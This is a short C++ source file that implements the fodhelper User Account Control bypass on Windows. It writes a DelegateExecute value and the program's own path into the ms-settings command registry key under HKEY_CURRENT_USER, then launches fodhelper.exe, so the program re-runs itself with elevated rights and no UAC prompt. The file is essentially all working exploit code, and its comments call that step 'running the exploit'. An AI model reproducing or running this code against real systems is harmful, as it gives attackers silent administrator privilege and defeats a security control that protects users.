#include "bpuac.h"
#include <windows.h>
#include <iostream>

/*
 *
 * The main bypass function
 * program flow is as follows
 * 1. Build the CMD string, this is how the program will call back to itself later
 * 2. Create the DelegateExecute and cmd string for recalling
 * 3. Open fodhelper via shellexecute, running the exploit
 * 4. Return to main
 *
 */

namespace core {
    const std::wstring CMD_P = L"C:\\Windows\\System32\\cmd.exe";
    const std::wstring FODHELPER = (L"C:\\Windows\\System32\\fodhelper.exe");
    const std::wstring KEY_PATH = L"Software\\Classes\\ms-settings\\shell\\open\\command";
    const std::wstring DELEGATE_EXEC_REG_KEY = L"DelegateExecute";

    HKEY hKey = nullptr;

    std::wstring BuildCmd() {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(nullptr, exePath, MAX_PATH);
        std::wstring fullPath(exePath);
        return fullPath;
    }

    bool createRegKey(const wchar_t *key, const wchar_t *value) {
        LONG res = RegCreateKeyExW(
            HKEY_CURRENT_USER,
            KEY_PATH.c_str(),
            0, nullptr,
            REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            nullptr,
            &hKey,
            nullptr
        );
        res = RegSetValueExW(
            hKey,
            key, // nullptr sets the default "(Default)" value
            0,
            REG_SZ,
            reinterpret_cast<const BYTE *>(value),
            static_cast<DWORD>((wcslen(value) + 1) * sizeof(wchar_t))
        );

        RegCloseKey(hKey);
        return true;
    }

    void bypass() {
        std::wstring cmd = BuildCmd();

        createRegKey(DELEGATE_EXEC_REG_KEY.c_str(), L"");
        createRegKey(nullptr, cmd.c_str());
        ShellExecuteW(nullptr, L"open", FODHELPER.c_str(), nullptr, nullptr, SW_SHOW);
    }
}
